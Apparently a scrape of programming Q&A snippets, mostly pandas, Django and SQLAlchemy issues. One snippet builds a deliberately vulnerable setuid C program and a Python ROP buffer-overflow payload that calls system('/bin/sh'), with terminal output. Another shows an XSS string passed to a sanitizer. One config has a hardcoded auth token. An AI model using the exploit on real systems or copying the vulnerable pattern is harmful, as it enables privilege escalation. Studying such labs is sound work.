"Acceptable feed values include Python scalars , strings , lists , or numpy ndarrays . model_params = BuildModelParams ( ) train_model = BuildModel ( model_params , train_input ) test_model = BuildModel ( model_params , test_input )"
"class TestForeign ( models.Model ) : test = models.CharField ( max_length=100 ) class BaseModel ( models.Model ) : # specified related_name to avoid reverse accesor clash foo = models.ForeignKey ( TestForeign , related_name='fooooo ' ) bar = models.ForeignKey ( TestForeign ) class Meta : abstract = Trueclass AnotherModel ( BaseModel ) : bla = models.CharField ( max_length=100 ) class YetAnotherModel ( BaseModel ) : bla = models.CharField ( max_length=100 ) ERRORS : Base.AnotherModel.bar : ( fields.E304 ) Reverse accessor for 'AnotherModel.bar ' clashes with reverse accessor for 'YetAnotherModel.bar'.HINT : Add or change a related_name argument to the definition for 'AnotherModel.bar ' or 'YetAnotherModel.bar'.Base.AnotherModel.bar : ( fields.E305 ) Reverse query name for 'AnotherModel.bar ' clashes with reverse query name for 'YetAnotherModel.bar'.HINT : Add or change a related_name argument to the definition for 'AnotherModel.bar ' or 'YetAnotherModel.bar'.Base.AnotherModel.foo : ( fields.E304 ) Reverse accessor for 'AnotherModel.foo ' clashes with reverse accessor for 'YetAnotherModel.foo'.HINT : Add or change a related_name argument to the definition for 'AnotherModel.foo ' or 'YetAnotherModel.foo'.Base.AnotherModel.foo : ( fields.E305 ) Reverse query name for 'AnotherModel.foo ' clashes with reverse query name for 'YetAnotherModel.foo'.HINT : Add or change a related_name argument to the definition for 'AnotherModel.foo ' or 'YetAnotherModel.foo'.Base.YetAnotherModel.bar : ( fields.E304 ) Reverse accessor for 'YetAnotherModel.bar ' clashes with reverse accessor for 'AnotherModel.bar'.HINT : Add or change a related_name argument to the definition for 'YetAnotherModel.bar ' or 'AnotherModel.bar'.Base.YetAnotherModel.bar : ( fields.E305 ) Reverse query name for 'YetAnotherModel.bar ' clashes with reverse query name for 'AnotherModel.bar'.HINT : Add or change a related_name argument to the definition for 'YetAnotherModel.bar ' or 'AnotherModel.bar'.Base.YetAnotherModel.foo : ( fields.E304 ) Reverse accessor for 'YetAnotherModel.foo ' clashes with reverse accessor for 'AnotherModel.foo'.HINT : Add or change a related_name argument to the definition for 'YetAnotherModel.foo ' or 'AnotherModel.foo'.Base.YetAnotherModel.foo : ( fields.E305 ) Reverse query name for 'YetAnotherModel.foo ' clashes with reverse query name for 'AnotherModel.foo'.HINT : Add or change a related_name argument to the definition for 'YetAnotherModel.foo ' or 'AnotherModel.foo ' ."
"myproject- setup.py- mylibrary - __init__.py - myfunction.py pip install < path/to/distribution > python > > > from mylibrary.myfunction import helloworld > > > helloworld ( ) # myproject/BUILDgenrule ( name = `` mylibrary_sdist '' , srcs = glob ( [ `` **/*.py '' ] ) , outs = [ `` mylibrary.tar.gz '' ] , cmd = `` python setup.py sdist & & mv dist/mylibrary*.tar.gz $ ( location mylibrary.tar.gz ) '' )"
"evil = `` < script > malignus script < /script > < b > bold text < /b > < i > italic text < /i > '' cleaner = Cleaner ( remove_unknown_tags=False , allow_tags= [ ' p ' , 'br ' , ' b ' ] , page_structure=True ) print cleaner.clean_html ( evil ) < b > bold text < /b > italic text < div > < b > bold text < /b > italic text < /div >"
"df1 = pd.DataFrame ( { ' a ' : [ 2,2,4,4 ] , ' b ' : [ 5,6,7,8 ] } ) df1.groupby ( ' a ' ) [ ' b ' ] .sum ( ) - > a2 114 15 df = pd.concat ( [ df1 , df1 ] , keys= [ ' c ' , 'd ' ] , axis=1 ) df - > c d a b a b0 2 5 2 51 2 6 2 62 4 7 4 73 4 8 4 8df.groupby ( [ ( ' c ' , ' a ' ) ] ) [ ( ' c ' , ' b ' ) ] .sum ( ) - > KeyError : `` Columns not found : ' b ' , ' c ' '' df.groupby ( [ ( ' c ' , ' a ' ) ] ) .apply ( lambda df : df [ ( ' c ' , ' b ' ) ] .sum ( ) )"
my_int = 5my_int.this_is_a_test AttributeError : 'int ' object has no attribute 'this_is_a_test ' my_int = 5my_int [ 0 ] TypeError : 'int ' object has no attribute '__getitem__ '
"*1 readv ( ) failed ( 13 : Permission denied ) while reading upstream , client : 10.0.3.1 , server : , request : `` GET /some/path/constants.js HTTP/1.1 '' , upstream : `` uwsgi : //unix : /var/uwsgi.sock : '' , host : `` dev.myhost.com '' readv ( 14 , 0x7fffb3d16a80 , 1 ) = -1 EACCES ( Permission denied ) socket ( PF_LOCAL , SOCK_STREAM , 0 ) = 14"
"class view ( mixins.CreateModelMixin , mixins.RetrieveModelMixin , viewsets.GenericViewSet ) : ... @ list_route ( methods= [ 'get ' ] ) def some_method ( self , request , **kwargs ) : queryset = Model.objects.all ( ) serializer = self.get_serializer ( queryset , many=True ) return Response ( serializer.data )"
"SUBROUTINE f90foo ( pyfunc , a ) real ( kind=8 ) , intent ( in ) : : a ! f2py intent ( callback ) pyfuncexternal pyfunc ! f2py real*8 y , x ! f2py y = pyfunc ( x ) ! *** debug begins***print * , 'Start Loop'do i=1,1000 p = pyfunc ( a ) end dototal = etime ( elapsed ) print * , 'End : total= ' , total , ' user= ' , elapsed ( 1 ) , ' system= ' , elapsed ( 2 ) stop ! *** debug ends *** def pythonfoo ( k ) : `` '' '' k : scalar returns : scalar `` '' '' print ( 'Pure Python : Start Loop ' ) start = time.time ( ) for i in xrange ( 1000 ) : p = pyfunc ( k ) elapsed = ( time.time ( ) - start ) print ( 'End : total= % 20f ' % elapsed )"
"import urwidclass MyListBox ( urwid.ListBox ) : def focus_next ( self ) : try : self.body.set_focus ( self.body.get_next ( self.body.get_focus ( ) [ 1 ] ) [ 1 ] ) except : pass def focus_previous ( self ) : try : self.body.set_focus ( self.body.get_prev ( self.body.get_focus ( ) [ 1 ] ) [ 1 ] ) except : pass def handle_input ( event ) : frame.header.set_text ( `` key pressed % s '' % event ) if event == `` q '' : raise urwid.ExitMainLoop elif event == `` up '' : lb.focus_previous ( ) elif event == `` down '' : lb.focus_next ( ) widgets = [ urwid.AttrMap ( urwid.Text ( str ( x ) ) , None , '' focus '' ) for x in xrange ( 3 ) ] nested = [ urwid.AttrMap ( urwid.Text ( str ( x ) + '' _sous '' ) , None , '' focus '' ) for x in xrange ( 3 ) ] nested_lb = MyListBox ( urwid.SimpleListWalker ( nested ) ) lb = MyListBox ( urwid.SimpleListWalker ( widgets+ [ nested_lb ] ) ) frame = urwid.Frame ( lb , header=urwid.Text ( `` Header '' ) ) palette = [ ( `` focus '' , '' dark cyan '' , '' white '' ) ] loop = urwid.MainLoop ( frame , palette , unhandled_input = handle_input ) loop.screen.set_terminal_properties ( colors=256 ) loop.run ( )"
size_a size_b0 1 21 1 52 2 33 2 94 3 15 3 56 4 4 size_a size_b0 1 21 2 NaN2 3 NaN size_a size_b0 1 21 2 32 2 93 3 14 3 5
"def split_string ( source , splitlist ) : result = [ ] for e in source : if e in splitlist : end = source.find ( e ) result.append ( source [ 0 : end ] ) tmp = source [ end+1 : ] for f in tmp : if f not in splitlist : start = tmp.find ( f ) break source = tmp [ start : ] return resultout = split_string ( `` After the flood ... all the colors came out . `` , `` . `` ) print out [ 'After ' , 'the ' , 'flood ' , 'all ' , 'the ' , 'colors ' , 'came out ' , `` , `` , `` , `` , `` , `` , `` , `` , `` ] def split_string ( source , splitlist ) : result = [ ] lasti = -1 for i , e in enumerate ( source ) : if e in splitlist : tmp = source [ lasti+1 : i ] if tmp not in splitlist : result.append ( tmp ) lasti = i if e not in splitlist and i == len ( source ) - 1 : tmp = source [ lasti+1 : i+1 ] result.append ( tmp ) return resultout = split_string ( `` This is a test-of the , string separation-code ! `` , '' , ! - '' ) print out # > > > [ 'This ' , 'is ' , ' a ' , 'test ' , 'of ' , 'the ' , 'string ' , 'separation ' , 'code ' ] out = split_string ( `` After the flood ... all the colors came out . `` , `` . `` ) print out # > > > [ 'After ' , 'the ' , 'flood ' , 'all ' , 'the ' , 'colors ' , 'came ' , 'out ' ] out = split_string ( `` First Name , Last Name , Street Address , City , State , Zip Code '' , '' , '' ) print out # > > > [ 'First Name ' , 'Last Name ' , 'Street Address ' , 'City ' , 'State ' , 'Zip Code ' ] out = split_string ( `` After the flood ... all the colors came out ... ... ... ... ... '' , `` . `` print out # > > > [ 'After ' , 'the ' , 'flood ' , 'all ' , 'the ' , 'colors ' , 'came ' , 'out ' ]"
"INSTALLED_APPS = [ ... 'oauth2_provider ' , 'rest_framework ' , ] REST_FRAMEWORK = { 'DEFAULT_AUTHENTICATION_CLASSES ' : ( 'oauth2_provider.contrib.rest_framework.OAuth2Authentication ' , ) , 'DEFAULT_PERMISSION_CLASSES ' : ( 'rest_framework.permissions.IsAuthenticated ' , ) , } # # # # # # # # # # # # # # # OAUTH SETTINGS # # # # # # # # # # # # # # # # # # # OAUTH2_PROVIDER = { 'SCOPES ' : { 'users ' : 'user details ' , 'read ' : 'Read scope ' , 'write ' : 'Write scope ' , 'groups ' : 'Access to your groups ' , 'introspection ' : 'introspection ' } , 'ACCESS_TOKEN_EXPIRE_SECONDS ' : 86400 , # 1 Day . } INSTALLED_APPS = [ ... 'oauth2_provider ' , 'rest_framework ' , ] REST_FRAMEWORK = { 'DEFAULT_AUTHENTICATION_CLASSES ' : ( 'oauth2_provider.contrib.rest_framework.OAuth2Authentication ' , ) , 'DEFAULT_PERMISSION_CLASSES ' : ( 'rest_framework.permissions.IsAuthenticated ' , ) , } # # # # # # # # # # # # # # # OAUTH SETTINGS # # # # # # # # # # # # # # # # # # # OAUTH2_PROVIDER = { 'RESOURCE_SERVER_INTROSPECTION_URL ' : 'http : //localhost:8000/o/introspect/ ' , 'RESOURCE_SERVER_AUTH_TOKEN ' : '3yUqsWtwKYKHnfivFcJu ' ,"
├── edible│ ├── nutritious│ └── ~nutritious└── ~edible
"import datetimeimport pandas as pdimport numpy as npimport matplotlib.pyplot as plt # create datetime index and random data columntodays_date = datetime.datetime.now ( ) .date ( ) index = pd.date_range ( todays_date-datetime.timedelta ( 10 ) , periods=14 , freq='D ' ) data = np.random.randint ( 1 , 10 , size=14 ) columns = [ ' A ' ] df = pd.DataFrame ( data , index=index , columns=columns ) # initialize new weekend column , then set all values to 'yes ' where the index corresponds to a weekend daydf [ 'weekend ' ] = 'no'df.loc [ ( df.index.weekday == 5 ) | ( df.index.weekday == 6 ) , 'weekend ' ] = 'yes'print ( df ) A weekend2014-10-13 7 no2014-10-14 6 no2014-10-15 7 no2014-10-16 9 no2014-10-17 4 no2014-10-18 6 yes2014-10-19 4 yes2014-10-20 7 no2014-10-21 8 no2014-10-22 8 no2014-10-23 1 no2014-10-24 4 no2014-10-25 3 yes2014-10-26 8 yes df.plot ( ) plt.show ( )"
"[ '179 ' , ' 0 ' , ' 1 ' , '51865852 ' , '51908076 ' , '42224 ' , '22 ' , ' 2 ' , '20 ' , '22 ' , ' 2 ' , ' 0.0516910530103 ' , ' 0.0511359922511 ' ] ind = tables.UInt16Col ( pos=0 ) hap = tables.UInt8Col ( pos=1 ) chrom = tables.UInt8Col ( pos=2 ) hap_start = tables.Int32Col ( pos=3 ) hap_end = tables.Int32Col ( pos=4 ) hap_len = tables.Int16Col ( pos=5 ) mh_sites = tables.Int16Col ( pos=6 ) mh_alt = tables.Int16Col ( pos=7 ) mh_n_ref = tables.Int16Col ( pos=8 ) all_sites = tables.Int16Col ( pos=9 ) all_alt = tables.Int16Col ( pos=10 ) freq = tables.Float32Col ( pos=11 ) std_dev = tables.Float32Col ( pos=12 ) a = [ x [ : ] for x in hap_table.where ( `` ' ( mh_sites == 15 ) & ( hap_len > 25000 ) & ( hap_len < 30000 ) & ( freq > .38 ) & ( freq < .4 ) & ( std_dev > .3 ) & ( std_dev < .4 ) ' '' ) ] byteorder : = 'little'chunkshape : = ( 32768 , ) autoIndex : = Truecolindexes : = { `` hap_len '' : Index ( 6 , medium , shuffle , zlib ( 1 ) ) .is_CSI=False , `` freq '' : Index ( 6 , medium , shuffle , zlib ( 1 ) ) .is_CSI=False , `` std_dev '' : Index ( 6 , medium , shuffle , zlib ( 1 ) ) .is_CSI=False , `` mh_sites '' : Index ( 6 , medium , shuffle , zlib ( 1 ) ) .is_CSI=False }"
- import dataFile+ dataFile = __import__ ( dataFile )
"import tensorflow as tfimport osos.environ [ 'TF_CPP_MIN_LOG_LEVEL ' ] = ' 2'sess = tf.Session ( ) a = tf.placeholder ( tf.float64 , name= '' A '' ) b = tf.placeholder ( tf.float64 , name= '' B '' ) add = tf.add ( a , b , name='Addition ' ) result = sess.run ( add , { a:32 , b:44 } ) print ( result ) file = tf.summary.FileWriter ( './logs ' , sess.graph ) sess.close ( ) TensorBoard 1.13.0a20190211 at http : //LAPTOP-Lin:6006 ( Press CTRL+C to quit ) Traceback ( most recent call last ) : File `` c : \python3.6.4\lib\runpy.py '' , line 193 , in _run_module_as_main `` __main__ '' , mod_spec ) File `` c : \python3.6.4\lib\runpy.py '' , line 85 , in _run_code exec ( code , run_globals ) File `` C : \Python3.6.4\Scripts\tensorboard.exe\__main__.py '' , line 9 , in < module > File `` c : \python3.6.4\lib\site-packages\tensorboard\main.py '' , line 62 , in run_main app.run ( tensorboard.main , flags_parser=tensorboard.configure ) File `` c : \python3.6.4\lib\site-packages\absl\app.py '' , line 300 , in run _run_main ( main , args ) File `` c : \python3.6.4\lib\site-packages\absl\app.py '' , line 251 , in _run_main sys.exit ( main ( argv ) ) File `` c : \python3.6.4\lib\site-packages\tensorboard\program.py '' , line 226 , in main self._register_info ( server ) File `` c : \python3.6.4\lib\site-packages\tensorboard\program.py '' , line 272 , in _register_info manager.write_info_file ( info ) File `` c : \python3.6.4\lib\site-packages\tensorboard\manager.py '' , line 268 , in write_info_file payload = `` % s\n '' % _info_to_string ( tensorboard_info ) File `` c : \python3.6.4\lib\site-packages\tensorboard\manager.py '' , line 128 , in _info_to_string for k in _TENSORBOARD_INFO_FIELDS File `` c : \python3.6.4\lib\site-packages\tensorboard\manager.py '' , line 128 , in < dictcomp > for k in _TENSORBOARD_INFO_FIELDS File `` c : \python3.6.4\lib\site-packages\tensorboard\manager.py '' , line 50 , in < lambda > serialize=lambda dt : int ( dt.strftime ( `` % s '' ) ) , ValueError : Invalid format string"
"import plotly.express as pxgapminder = px.data.gapminder ( ) .query ( `` continent=='Oceania ' '' ) fig = px.line ( gapminder , x= '' year '' , y= '' lifeExp '' , color='country ' ) fig.show ( )"
"Base = sqlalchemy.ext.declarative.declarative_base ( ) class BaseEntity ( Base ) : value = Column ( 'value ' , String ( 40 ) , default=BaseEntity.gen_default ) def gen_default ( self ) : # do something with self , for example # generate a default value using some other data # attached to the object return self.default_value"
"# include < stdio.h > # include < stdlib.h > # include < unistd.h > void shell ( ) { system ( `` /bin/sh '' ) ; exit ( 0 ) ; } int vuln ( ) { char buf [ 4 ] ; ssize_t l=0 ; printf ( `` [ + ] input : `` ) ; l=read ( 0 , buf,128 ) ; printf ( `` [ + ] recv : `` ) ; write ( 1 , buf , l ) ; return 0 ; } int main ( ) { //setbuf ( stdout,0 ) ; setuid ( 0 ) ; seteuid ( 0 ) ; vuln ( ) ; return 0 ; } # ! /usr/bin/pythonfrom struct import *from subprocess import callpoprdi=0x4007e3 # pop rdi ; ret ; system_plt=0x400560 # address of system @ pltexit_plt=0x4005a0 # address of exit @ pltshell=0x400804 # address of '/bin/sh'buf=b '' buf+=bytearray ( `` A '' , '' utf-8 '' ) *24buf+=pack ( `` < Q '' , poprdi ) buf+=pack ( `` < Q '' , shell ) buf+=pack ( `` < Q '' , system_plt ) buf+=pack ( `` < Q '' , poprdi ) buf+=pack ( `` < Q '' ,0 ) buf+=pack ( `` < Q '' , exit_plt ) with open ( `` pwn '' , '' w '' ) as p : p.write ( buf ) zaphoxx @ zaphoxx ~/github/ghostInTheShell $ vim shellcode.czaphoxx @ zaphoxx ~/github/ghostInTheShell $ gcc -fno-stack-protector -o shell shellcode.czaphoxx @ zaphoxx ~/github/ghostInTheShell $ sudo chown root : root shell ; sudo chmod 4755 shellzaphoxx @ zaphoxx ~/github/ghostInTheShell $ ll shell-rwsr-xr-x 1 root root 8608 Oct 17 21:29 shell*zaphoxx @ zaphoxx ~/github/ghostInTheShell $ ./shell $ id uid=1000 ( zaphoxx ) gid=1000 ( zaphoxx ) groups=1000 ( zaphoxx ) ,4 ( adm ) ,24 ( cdrom ) ,27 ( sudo ) ,30 ( dip ) ,33 ( www-data ) ,46 ( plugdev ) ,113 ( lpadmin ) ,130 ( sambashare ) $ whoami zaphoxx $ exit zaphoxx @ zaphoxx ~/github/ghostInTheShell $ cat shellcode.c # include < stdio.h > # include < unistd.h > int main ( ) { char *name [ 2 ] ; name [ 0 ] = '' /bin/sh '' ; name [ 1 ] =NULL ; execve ( name [ 0 ] , name , NULL ) ; } zaphoxx @ zaphoxx ~/github/ghostInTheShell $ zaphoxx @ zaphoxx ~/github/ghostInTheShell $ ll $ ( which sh ) lrwxrwxrwx 1 root root 12 Oct 15 22:09 /bin/sh - > /usr/bin/zsh*zaphoxx @ zaphoxx ~/github/ghostInTheShell $ zaphoxx @ zaphoxx ~/github/ghostInTheShell $ ./ghost < pwnuid=1000 ( zaphoxx ) gid=1000 ( zaphoxx ) groups=1000 ( zaphoxx ) ,4 ( adm ) ,24 ( cdrom ) ,27 ( sudo ) ,30 ( dip ) ,33 ( www-data ) ,46 ( plugdev ) ,113 ( lpadmin ) ,130 ( sambashare ) [ + ] recv : AAAAAAAAHzaphoxx @ zaphoxx ~/github/ghostInTheShell $ ll ./ghost-rwsr-xr-x 1 root root 8816 Oct 17 22:25 ./ghost*zaphoxx @ zaphoxx ~/github/ghostInTheShell $ zaphoxx @ zaphoxx ~/github/ghostInTheShell $ cat ghost.c # include < stdio.h > # include < stdlib.h > # include < unistd.h > void shell ( ) { system ( `` /usr/bin/id '' ) ; exit ( 0 ) ; } int vuln ( ) { char buf [ 4 ] ; ssize_t l=0 ; l=read ( 0 , buf,128 ) ; printf ( `` [ + ] recv : % s '' , buf ) ; //write ( 1 , buf , l ) ; return 0 ; } int main ( ) { //shell ( ) ; //setbuf ( stdout,0 ) ; //setuid ( 0 ) ; //seteuid ( 0 ) ; vuln ( ) ; return 0 ; } zaphoxx @ zaphoxx ~/github/ghostInTheShell $ zaphoxx @ zaphoxx ~ $ cat /proc/mounts | grep zaphoxx/home/zaphoxx/.Private /home/zaphoxx ecryptfs rw , nosuid , nodev , relatime"
"class Gallery ( models.Model ) : title = models.CharField ( max_length=30 ) author = models.ForeignKey ( User , on_delete=models.CASCADE ) created_on = models.DateTimeField ( auto_now_add=True , blank=True ) modified_on = models.DateTimeField ( auto_now=True , blank=True ) def __str__ ( self ) : return self.titleclass Image ( models.Model ) : gallery_id = models.ForeignKey ( Gallery , on_delete=models.CASCADE ) img = models.ImageField ( upload_to='images/ ' ) created_on = models.DateTimeField ( auto_now_add=True , blank=True ) class ImageSerializer ( serializers.HyperlinkedModelSerializer ) : class Meta : model = Image fields = [ `` gallery_id '' , `` img '' , `` created_on '' , `` id '' ] class GallerySerializer ( serializers.HyperlinkedModelSerializer ) : image = ImageSerializer ( many=True , read_only=True ) def validate ( self , data ) : # Check if user id is equal object id before creation or if SuperUser request = self.context.get ( `` request '' ) if request.user.id ! = data [ `` author '' ] .id and request.user.is_superuser is not True : raise ValidationError ( `` Unauthorized User Post '' ) return data class Meta : model = Gallery fields = [ `` title '' , `` author '' , `` created_on '' , `` modified_on '' , `` image '' , `` id '' ] [ { `` title '' : `` test_1 '' , `` author '' : `` http : //127.0.0.1:8000/api/users/2/ '' , `` created_on '' : `` 2019-08-19T09:13:45.107658Z '' , `` modified_on '' : `` 2019-08-19T09:13:45.107731Z '' , `` image '' : [ { `` gallery_id '' : `` http : //127.0.0.1:8000/api/galleries/24/ '' , `` img '' : `` http : //127.0.0.1:8000/media/images/angga-tantama-background-art-minimalism.jpg '' , `` created_on '' : `` 2019-08-20T09:17:31.790901Z '' , `` id '' : 6 } , { `` gallery_id '' : `` http : //127.0.0.1:8000/api/galleries/24/ '' , `` img '' : `` http : //127.0.0.1:8000/media/images/art-vector-background-illustration-minimalism-angga-tantam-2.jpg '' , `` created_on '' : `` 2019-08-20T09:31:40.505035Z '' , `` id '' : 7 } ] `` id '' : 24 } , { `` title '' : `` test_2 '' , `` author '' : `` http : //127.0.0.1:8000/api/users/2/ '' , `` created_on '' : `` 2019-08-20T09:42:09.448974Z '' , `` modified_on '' : `` 2019-08-20T09:42:09.449042Z '' , `` id '' : 27 } ]"
"def mymerge ( dfs , labels ) : labels_dict = dict ( [ ( d , l ) for d , l in zip ( dfs , labels ) ] ) merged_df = reduce ( lambda x , y : pandas.merge ( x , y , suffixes= [ labels_dict [ x ] , labels_dict [ y ] ] ) , dfs ) return merged_df pandas.tools.merge.MergeError : Combinatorial explosion ! ( boom ) def my_merge ( dfs_list , on ) : `` '' '' list of dfs , columns to merge on. `` '' '' my_df = dfs_list [ 0 ] for right_df in dfs_list [ 1 : ] : # Only put the columns from the right df # that are not in the existing combined df ( i.e . new ) # or which are part of the columns to join on new_noncommon_cols = [ c for c in right_df \ if ( c not in my_df.columns ) or \ ( c in on ) ] my_df = pandas.merge ( my_df , right_df [ new_noncommon_cols ] , left_index=True , right_index=True , how= '' outer '' , on=on ) return my_df df1 = pandas.DataFrame ( [ { `` employee '' : `` bob '' , `` gender '' : `` male '' , `` bob_id1 '' : `` a '' } , { `` employee '' : `` john '' , `` gender '' : `` male '' , `` john_id1 '' : `` x '' } ] ) df1 = df1.set_index ( `` employee '' ) df2 = pandas.DataFrame ( [ { `` employee '' : `` mary '' , `` gender '' : `` female '' , `` mary_id1 '' : `` c '' } , { `` employee '' : `` bob '' , `` gender '' : `` male '' , `` bob_id2 '' : `` b '' } ] ) df2 = df2.set_index ( `` employee '' ) df3 = pandas.DataFrame ( [ { `` employee '' : `` mary '' , `` gender '' : `` female '' , `` mary_id2 '' : `` d '' } ] ) df3 = df3.set_index ( `` employee '' ) merged = my_merge ( [ df1 , df2 , df3 ] , on= [ `` gender '' ] ) print `` MERGED : `` print merged"
"y = [ 11 , 13 , 15 ] z = [ 12 , 14 ] ypos = [ 1 , 3 , 5 ] y = [ 77 ] z = [ 35 , 58 , 74 ] ypos = [ 3 ] def func ( y , z , ypos ) : x = [ 0 ] * ( len ( y ) + len ( z ) ) zpos = list ( range ( len ( y ) + len ( z ) ) ) for i , j in zip ( y , ypos ) : x [ j-1 ] = i zpos.remove ( j-1 ) for i , j in zip ( z , zpos ) : x [ j ] = i return x"
"class ClaElement : start = None end = None basesLeft = None orientation = None contig = None size = None def __init__ ( self , contig , start , end , orientation , basesLeft=None ) : self.contig = contig self.start = start self.end = end self.orientation = orientation self.basesLeft = basesLeft self.size = self.end - self.start def __str__ ( self ) : return `` { ClaElement : `` +str ( self.contig ) + '' _ '' +str ( self.start ) + '' _ '' +str ( self.end ) + '' _ '' +str ( self.orientation ) + '' } '' def getSize ( self ) : return self.sizeclass ClaCluster : contig = None clusterElements = [ ] def __init__ ( self , contig , firstElement ) : self.contig = contig self.addElement ( firstElement ) def addElement ( self , claElement ) : self.clusterElements.append ( claElement ) def getFirst ( self ) : return self.clusterElements [ 0 ] def getLast ( self ) : return self.clusterElements [ -1 ] def getElements ( self ) : return self.clusterElements def getContig ( self ) : return self.contig def __str__ ( self ) : return `` { ClaCluster : `` +str ( self.contig ) + '' `` +str ( len ( self.clusterElements ) ) + '' elements } '' from ClaElement import ClaElementfrom ClaCluster import ClaClusterif __name__ == '__main__ ' : ele = ClaElement ( `` x '' ,1,2 , '' left '' ) claDict = dict ( ) cluster = ClaCluster ( `` x '' , ele ) claDict [ `` hello '' ] = cluster print ( claDict ) print ( claDict [ `` hello '' ] ) print ( ele ) { 'hello ' : < ClaCluster.ClaCluster object at 0x7fe8ee04c5f8 > } { ClaCluster : x 1 elements } { ClaElement : x_1_2_left }"
migrations/0158_backward__migrate_to_0156.py
"x = np.arange ( 100 ) y = np.arange ( 100 ) X , Y = np.meshgrid ( x , y ) Z = np.cos ( X ) *np.sin ( Y ) Z_new = np.zeros ( ( 5 , 5 ) ) for i in range ( 5 ) : for j in range ( 5 ) : Z_new [ i , j ] = np.sum ( Z [ i*20:20+i*20 , j*20:20+j*20 ] ) x = np.linspace ( 0 , 1 , 100 ) y = np.linspace ( 0 , 1 , 100 ) X , Y = np.meshgrid ( x , y ) Z = np.cos ( X ) *np.sin ( Y ) x_new = np.linspace ( 0 , 1 , 15 ) y_new = np.linspace ( 0 , 1 , 15 )"
"source = models.ForeignKey ( 'self ' , help_text = `` [ redacted ] '' , verbose_name = `` Source Order '' , blank = True , null = True , )"
"index inp aco count 0 2.3.6. dp-ptp-a2f 22000 1 2.3.12. ft-ptp-a2f 21300 2 2.5.9. dp-ptp-a2f 21010 3 0.8.0. dp-ptp-a4f 20000 4 2.3.6. ft-ptp-a2f 19000 5 2.3.6. ff-ptp-a2f 18500 ... ... ... ... ... ... df1=df.pivot_table ( values='count ' , index='inp ' , columns='aco ' , fill_value=0 ) print ( df1 ) IndexError : index 1491188345 is out of bounds for axis 0 with size 1491089723"
ipython-0.13.1.py2-win32-PROPER.exescipy-0.12.0b1.win32-py2.7.exenumpy-MKL-1.7.0.win32-py2.7.exepywin32-218.win32-py2.7.exe
"NetworkXError : 'user_id ' is not a valid key g = nx.read_gml ( file_path + `` test_graph_1.gml '' ) h = nx.read_gml ( file_path + `` test_graph_2.gml '' ) node [ id 9user_id `` 1663413990 '' file `` wingsscotland.dat '' label `` brian_bilston '' image `` /Users/ian/development/gtf/gtf/img/1663413990.jpg '' type `` friends '' statuses 21085friends 737followers 53425listed 550ffr 72.4898lfr 0.1029shape `` triangle-up '' ] list ( f.nodes ( data=True ) ) ( 'brian_bilston ' , { 'ffr ' : 72.4898 , 'file ' : 'wingsscotland.dat ' , 'followers ' : 53425 , 'friends ' : 737 , 'image ' : '/Users/ian/development/gtf/gtf/img/1663413990.jpg ' , 'lfr ' : 0.1029 , 'listed ' : 550 , 'shape ' : 'triangle-up ' , 'statuses ' : 21085 , 'type ' : 'friends ' , 'user_id ' : '1663413990 ' } ) f = nx.compose ( g , h ) nx.write_gml ( f , file_path + `` one_plus_two.gml '' ) NetworkXError : 'user_id ' is not a valid key uid = nx.get_node_attributes ( f , 'user_id ' ) print ( uid ) { 'brian_bilston ' : '1663413990 ' , 'ICMResearch ' : '100 ' , 'justcswilliams ' : '200 ' , 'MissBabington ' : '300 ' , 'ProBirdRights ' : '400 ' , 'FredSmith ' : '247775851 ' , 'JasWatt ' : '160952087 ' , 'Angela_Lewis ' : '2316946782 ' , 'Fuzzpig54 ' : '130136162 ' , 'SonnyRussel ' : '828881340 ' , 'JohnBird ' : '448476934 ' , 'AngusMcAngus ' : '19785044 ' }"
"class Config ( Base ) : __tablename__ = 'config ' ID = Column ( 'ID ' , Integer , primary_key=True ) name = Column ( 'name ' , String ) last_modified = Column ( 'last_modified ' , DateTime , default=now , onupdate=now ) params = relationship ( 'ConfigParam ' , backref='config ' ) class ConfigParam ( Base ) : __tablename__ = 'config_params ' ID = Column ( 'ID ' , Integer , primary_key=True ) ConfigID = Column ( 'ConfigID ' , Integer , ForeignKey ( 'config.ID ' ) , nullable=False ) key = Column ( 'key ' , String ) value = Column ( 'value ' , Float ) @ event.listens_for ( Config.params , 'append ' ) @ event.listens_for ( Config.params , 'remove ' ) def receive_append_or_remove ( target , value , initiator ) : target.last_modified = now ( ) @ event.listens_for ( ConfigParam.key , 'set ' ) @ event.listens_for ( ConfigParam.value , 'set ' ) def receive_attr_change ( target , value , oldvalue , initiator ) : if target.config : # do n't act if the parent config is n't yet set # i.e . during __init__ target.config.last_modified = now ( )"
"from bokeh.plotting import figurefrom bokeh.models import LinearAxis , Range1dfrom bokeh.io import output_notebook , showoutput_notebook ( ) s1=figure ( width=250 , plot_height=250 , title=None , tools= '' pan , wheel_zoom '' ) s1.line ( [ 1 , 2 , 3 ] , [ 300 , 300 , 400 ] , color= '' navy '' , alpha=0.5 ) s1.extra_y_ranges = { `` foo '' : Range1d ( start=1 , end=9 ) } s1.add_layout ( LinearAxis ( y_range_name= '' foo '' ) , 'right ' ) s1.line ( [ 1 , 2 , 3 ] , [ 4 , 4 , 1 ] , color= '' firebrick '' , alpha=0.5 , y_range_name= '' foo '' ) show ( s1 )"
"project_dir lib __init__.py ... some_script.py ... agent __init__.py ... errors.py some_agent_script.py ... from errors import SomeException from agent.errors import SomeException try : # Here comes a call to lib/agent/some_agent_script.py function # that raises SomeExceptionexcept SomeException , exc : # Never goes here print ( exc ) except Exception , exc : print ( exc.__class__.__name__ ) # prints `` SomeException '' # Let 's print id 's print ( id ( exc.__class__ ) ) print ( id ( SomeException ) ) # They are different ! # Let 's print modules list pprint.pprint ( sys.modules ) agent_errors = sys.modules.get ( 'agent.errors ' ) from agent_errors import SomeExceptiontry : # Here comes a call to lib/agent/some_agent_script.py functionexcept SomeException : print ( 'OK ' )"
"import numpy as np # 3x3m = np.array ( [ [ 1,2,3 ] , [ 4,5,6 ] , [ 7,8,9 ] ] ) # array of 3x3a = np.array ( [ m , m , m , m ] ) # rotate a single matrix counter-clockwisedef rotate90 ( x ) : return np.rot90 ( x ) # function that can be called on all elements of an np.array # Note : I 've tried different values for otypes= without successf = np.vectorize ( rotate90 ) result = f ( a ) # ValueError : Axes= ( 0 , 1 ) out of range for array of ndim=0. # The error occurs in NumPy 's rot90 ( ) function . t = np.array ( [ np.rot90 ( x , k=-1 ) for x in a ] )"
list ( set ( hr1 ) & set ( hr2 ) & set ( hr4 ) & set ( hr8 ) & set ( hr24 ) )
